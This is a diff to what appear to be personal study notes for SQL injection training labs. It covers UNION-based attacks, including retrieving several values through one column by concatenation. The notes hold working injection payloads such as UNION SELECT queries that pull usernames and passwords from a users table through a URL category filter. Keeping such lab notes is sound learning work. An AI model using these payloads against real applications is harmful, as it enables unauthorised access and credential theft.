@@ -67,4 +67,12 @@ TIP to find password:- ' UNION SELECT username, password FROM users--
     2.url/filter?category=Lifestyle'UNION+SELECT+username,password+FROM+users--
     3.then solved
 
-#
+Theory:- If we have to extract multiple values from a single column we can use concatenation function of that particular database.
+        SELECT CONCAT(username, '~', email) AS user_info FROM users;
+
+#6 Lab: SQL injection UNION attack, retrieving multiple values in a single column
+ 
+    1.'+UNION+SELECT+NULL,'abc'--   (abc is used here cus it insures that the column is string )
+    2.'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+LOGIC USED:- use concatenation function of that particular database to extract multiple values from a single column 
